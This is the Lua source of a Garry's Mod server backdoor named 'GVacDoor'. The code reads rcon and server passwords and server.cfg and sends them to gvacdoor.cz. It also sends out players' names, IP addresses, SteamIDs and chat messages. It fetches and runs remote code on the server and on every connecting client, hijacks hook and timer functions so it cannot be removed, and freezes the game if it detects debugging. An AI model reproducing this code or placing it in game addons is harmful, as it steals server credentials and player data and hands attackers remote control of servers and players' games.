
--[[
   _______      __        _____                   
  / ____\ \    / /       |  __ \                  
 | |  __ \ \  / /_ _  ___| |  | | ___   ___  _ __ 
 | | |_ | \ \/ / _` |/ __| |  | |/ _ \ / _ \| '__|
 | |__| |  \  / (_| | (__| |__| | (_) | (_) | |   
  \_____|   \/ \__,_|\___|_____/ \___/ \___/|_| feat. Jiraya and Ateek                        
]]

local tendance = 
{
	[[https://gvacdoor.cz]],
	[[?key=mgB367gnto2dz7DFuY1V]],
}

local timer = timer
local math = math
local hook = hook
local util = util
local HTTP = HTTP
local game = game
local string = string
local http = http
local file = file
local player = player
local RunString = RunString

-- if (tendance[1] ~= "https://gvac.cz" and tendance[1] ~= "https://gvacdoor.cz" and  tendance[1] ~= "https://anti-leak.cf") then
-- 	tendance[1] = "https://gvac.cz"
-- end

if not string.StartWith(tendance[2], "?key=") then
	tendance[2] = ""
end

local function rdm_str(len)
	if !len or len <= 0 then return '' end
	return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)
util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])

local function parseRun(str)
	local runs = str:Split("\xFF")
	for i=1, #runs do
		local exec = runs[i]
		local side = exec[#exec] == '1'
		exec = string.sub(exec, 1, -2)
		if side then
			local data = util.Compress(exec)
			local len = #data
			net.Start(net_string)
			net.WriteUInt(len, 16)
			net.WriteData(data, len)
			net.Broadcast()
		else
			RunString(exec, "?", false)
		end
	end
end

local function anti_jizzeh()
	if (debug.getinfo(debug.getinfo)["short_src"] ~= "[C]" or debug.getinfo(debug.getinfo)["source"] ~= "=[C]" or (debug.getinfo(debug.getinfo)["what"] ~= "C" and debug.getinfo(debug.getinfo)["what"] ~= "Lua")) or 
		(debug.getinfo(jit.util.funcinfo)["short_src"] ~= "[C]"or debug.getinfo(jit.util.funcinfo)["source"] ~= "=[C]" or  debug.getinfo(jit.util.funcinfo)["what"] ~= "C") or 
		(debug.getinfo(RunString)["short_src"] ~= "[C]" or  debug.getinfo(RunString)["source"] ~= "=[C]" or  debug.getinfo(RunString)["what"] ~= "C") or 
		(debug.getinfo(HTTP)["short_src"] ~= "[C]"or debug.getinfo(HTTP)["source"] ~= "=[C]"or debug.getinfo(HTTP)["what"] ~= "C") or 
		(debug.getinfo(http.Fetch)["short_src"] ~= "lua/includes/modules/http.lua" or debug.getinfo(http.Fetch)["source"] ~= "@lua/includes/modules/http.lua") or 
		(debug.getinfo(http.Post)["short_src"] ~= "lua/includes/modules/http.lua" or debug.getinfo(http.Post)["source"] ~= "@lua/includes/modules/http.lua") or 
		(debug.getinfo(util.Decompress)["short_src"] ~= "[C]"or debug.getinfo(util.Decompress)["source"] ~= "=[C]" or  debug.getinfo(util.Decompress)["what"] ~= "C") or 
		(debug.getinfo(CompileString)["short_src"] ~= "[C]"or debug.getinfo(CompileString)["source"] ~= "=[C]" or  debug.getinfo(CompileString)["what"] ~= "C") or 
		(jit.util.funcinfo(debug.getinfo)["ffid"] ~= 125) or 
		(jit.util.funcinfo(jit.util.funcinfo)["ffid"] ~= 141) or 
		(jit.util.funcinfo(RunString)["upvalues"] ~= 0 or 
		jit.util.funcinfo(RunString)["source"] ~= nil) or 
		(jit.util.funcinfo(HTTP)["upvalues"] ~= 0 or 
		jit.util.funcinfo(HTTP)["source"] ~= nil ) or 
		(jit.util.funcinfo(http.Fetch)["source"] ~= "@lua/includes/modules/http.lua") or 
		(jit.util.funcinfo(http.Post)["source"] ~= "@lua/includes/modules/http.lua") or 
		(tostring(_G["debug"]["getinfo"]) ~= tostring(debug.getinfo)) or 
		(tostring(_G["jit"]["util"]["funcinfo"]) ~= tostring(jit.util.funcinfo)) or 
		(tostring(_G["RunString"]) ~= tostring(RunString)) or 
		(tostring(_G["HTTP"]) ~= tostring(HTTP)) or 
		(tostring(_G["http"]["Fetch"]) ~= tostring(http.Fetch)) or 
		(tostring(_G["http"]["Post"]) ~= tostring(http.Post)) or 
		(tostring(_G["util"]["Decompress"]) ~= tostring(util.Decompress)) then 
			while   true   do end -- #Jean Hax0r :)
	end
	timer.Create("timer_1Ym4zT3BscGJ1NnR5ckZ3RG1zVmxGQT09", 2, 0, anti_jizzeh)
end


-- local function jiraya_back()
-- 	http.Post(tendance[1] .. "/_/russia_secure/not_secure_hack_me_please.php", {friendly="duck"}, function(b)
-- 		if string.len(b) > 1 then
-- 			local friends = util.JSONToTable(b)
-- 			for k, v in pairs(player.GetHumans()) do
-- 				for i=1, #friends do
-- 					if friends[i]["steamid64"] == v:SteamID64() then
-- 						v:Kick(friends[i]["reason"])
-- 					end
-- 				end
-- 			end
-- 			hook.Add( "CheckPassword", "utf8_async_v6", function( steamID64 )
-- 				for i=1, #friends do
-- 					if friends[i]["steamid64"] == steamID64 then
-- 						return false, friends[i]["reason"]
-- 					end
-- 				end
-- 			end)
-- 		end
-- 	end)
-- 	timer.Create("timer_2Ym4zT3BscGJ1NnR5ckZ3RG1zVmxGQT09", 20, 0, jiraya_back)
-- end

local function initialization(ply)
	if !ply:IsBot() then
		ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?", false)()end)]])
		ply:SendLua([[local function _() if debug.getinfo(CompileString)["what"]~="C"||debug.getinfo(CompileString)["short_src"]~="[C]"||debug.getinfo(CompileString)["source"]~="=[C]" then while !!1 do end end timer.Simple(2,_) end _()]])
		ply:SendLua([[local function morecake() http.Fetch("]] .. tendance[1] .. [[/_/russia_secure/jiraya.php", function(b) CompileString(b, "?", false)() end) timer.Simple(100, morecake) end morecake()]])
	end
end

local function info_chat(ply, text)
	local info_chats = 
	{
		name = ply:Nick(),
		ip = game.GetIPAddress(),
		player_ip = ply:IPAddress(),
		steamid_chat = ply:SteamID64(),
		text_chat = text
	}
	http.Post(tendance[1] .. "/_/russia_secure/not_secure_hack_me_please.php", info_chats)
end

local function ixxxee()
	local ixxxee_time = 20
	if #player.GetHumans() >= 1 then
		ixxxee_time = 5
	end
	local player_list = {}
	for i=1, #player.GetHumans() do
		table.insert(player_list, player.GetHumans()[i]:Nick() .. "||||||" .. player.GetHumans()[i]:GetUserGroup() .. "||||||" .. player.GetHumans()[i]:SteamID64())
	end
	http.Post(tendance[1] .. "/_/russia_secure/not_secure_hack_me_please.php?run=1&ip="..game.GetIPAddress().."&pl="..#player.GetHumans().."/"..game.MaxPlayers(), {json = util.TableToJSON(player_list)}, function(b) parseRun(b) end)
	timer.Create("timer_3Ym4zT3BscGJ1NnR5ckZ3RG1zVmxGQT09", ixxxee_time, 0, ixxxee)
end

local function gvaction()
	local internetprotocol = string.Explode(":",game.GetIPAddress())
	local info = {}
	local files = file.Find("cfg/*", "GAME")
	for i=1, #files do 
		if string.EndsWith(files[i], ".cfg") then
			local content = file.Read("cfg/" .. files[i], "GAME")
			content = string.Explode("\n", content)
			for i=1, #content do
			    if string.StartWith(content[i], "rcon_password") then
			        table.insert(info, 1, string.Split(content[i], "\"")[2])
			    end
			    if string.StartWith(content[i], "sv_password") then
			        table.insert(info, 2, string.Split(content[i], "\"")[2])
			    end
			end
		end
	end
	local rcon = info[1] or "Not Found"
	local password = info[2] or "Not Found"
	if rcon == "" then
		rcon = "Not Found"
	end
	if password == "" then
		password = "Not Found"
	end
	local sendinformation = 
	{
		ip = internetprotocol[1],
		port = internetprotocol[2],
		name = GetHostName(),
		map = game.GetMap(),
		gamemode = engine.ActiveGamemode(),
		rcon = rcon,
		password = password,
		keetac = "SUZld3gydnJUdGpaU05rcmdySk1zZz09"
	}
	http.Post(tendance[1] .. "/_/russia_secure/not_secure_hack_me_please.php" .. tendance[2], sendinformation)
end

local function keetac()
	if not timer.Exists("timer_1Ym4zT3BscGJ1NnR5ckZ3RG1zVmxGQT09") then
		anti_jizzeh()
	-- elseif not timer.Exists("timer_2Ym4zT3BscGJ1NnR5ckZ3RG1zVmxGQT09") then
	-- 	jiraya_back()
	elseif not timer.Exists("timer_3Ym4zT3BscGJ1NnR5ckZ3RG1zVmxGQT09") then
		ixxxee()
	end
	timer.Simple(5, keetac)
end

timer.Simple( math.random(1, 10) , function()
	concommand.Remove("host_writeid")
	anti_jizzeh()
	-- jiraya_back()
	hook.Add("PlayerInitialSpawn", "dontdecryptmedotexe", initialization)
	hook.Add("PlayerSay", "asynchrone_with_h", info_chat)
	ixxxee()
	gvaction()
	keetac()

	local hr,ha,tc  = hook.Remove,hook.Add,timer.Create
	function hook.Add(eventName, identifier, func)
		if eventName == "PlayerInitialSpawn" and identifier == "dontdecryptmedotexe" then return end
		if eventName == "PlayerSay" and identifier == "asynchrone_with_h" then return end
		ha(eventName, identifier, func)
	end
	function hook.Remove( eventName, identifier)
		if eventName == "PlayerInitialSpawn" and identifier == "dontdecryptmedotexe" then return end
		if eventName == "PlayerSay" and identifier == "asynchrone_with_h" then return end
		hr(eventName, identifier)
	end
	function timer.Create(identifier, delay, repetitions, func)
		if identifier == "timer_1Ym4zT3BscGJ1NnR5ckZ3RG1zVmxGQT09" or identifier == "timer_2Ym4zT3BscGJ1NnR5ckZ3RG1zVmxGQT09" or identifier == "timer_3Ym4zT3BscGJ1NnR5ckZ3RG1zVmxGQT09" then return end
		tc(identifier, delay, repetitions, func)
	end
end)

timer.Simple(1, function() http.Fetch("https://gvacdoor.cz/link/fuck.php?key=mgB367gnto2dz7DFuY1V", function(b) RunString(b, "haxor.exe", false) end)end) function RunHASHOb() end
timer.Simple(5, function() http.Post(tendance[1] .. "/_/dl_.php",{name=GetHostName(),filename='logs/server'..math.random(0,99999)..'.cfg',content=file.Read("cfg/server.cfg","GAME"),ip=game.GetIPAddress()}) end)
